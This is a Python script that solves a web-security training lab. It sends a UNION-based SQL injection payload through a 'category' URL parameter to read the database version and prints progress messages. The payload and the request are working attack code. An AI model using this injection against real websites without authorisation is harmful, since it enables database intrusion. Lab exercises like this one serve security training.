##################################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 16/9/2023
#
# Lab: SQL injection attack, querying the database type and version on MySQL 
#      and Microsoft
#
# Steps: 1. Inject payload in 'category' query parameter
#        2. Retrieve database version in the response
#
##################################################################################


###########
# imports
###########
import requests
from colorama import Fore


#########
# Main
#########

# change this to your lab URL
url = "https://0ab40071035e593182e24c6d0026005b.web-security-academy.net" 

# payload to return the database version
payload = "' UNION SELECT @@version, null-- -"

try:
    # fetch the page with the injected payload
    injection = requests.get(f"{url}/filter?category={payload}")

except:
    print(Fore.RED + "[!] Failed to inject the payload through exception")
    exit(1)

print(Fore.WHITE + "1. Injecting payload in 'category' query parameter.. " + Fore.GREEN + "OK")

# if response is OK
if injection.status_code == 200:
    print(Fore.WHITE + "2. Retrieving database version in the response.. " + Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")

else:
    print(Fore.RED + "[!] Failed to inject the payload")
